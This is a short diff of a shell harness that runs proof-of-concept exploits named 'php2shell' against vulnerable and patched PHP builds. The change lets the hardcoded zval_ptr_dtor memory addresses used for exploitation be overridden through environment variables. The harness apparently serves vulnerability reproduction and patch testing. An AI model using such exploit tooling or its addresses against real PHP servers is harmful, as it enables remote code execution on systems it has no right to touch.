@@ -10,9 +10,9 @@ VARIANT="$1"; URL="${2%/}/"
 #   patched    php:8.3.37 zval_ptr_dtor runtime = 0x555555ADD5D0
 #   delta (both builds) = 0xDBC0  -- see profile-deltas.tsv
 case "$VARIANT" in
-  vulnerable) DTOR=0x555555ADD150 ;;
-  patched)    DTOR=0x555555ADD5D0 ;;
-  *)          DTOR=0 ;;
+  vulnerable) DTOR=${DTOR_V:-0x555555ADD150} ;;
+  patched)    DTOR=${DTOR_P:-0x555555ADD5D0} ;;
+  *)          DTOR=${DTOR_V:-0} ;;
 esac
 HIT=0
 for P in pocs/php2shell-618.py pocs/php2shell-619.py; do
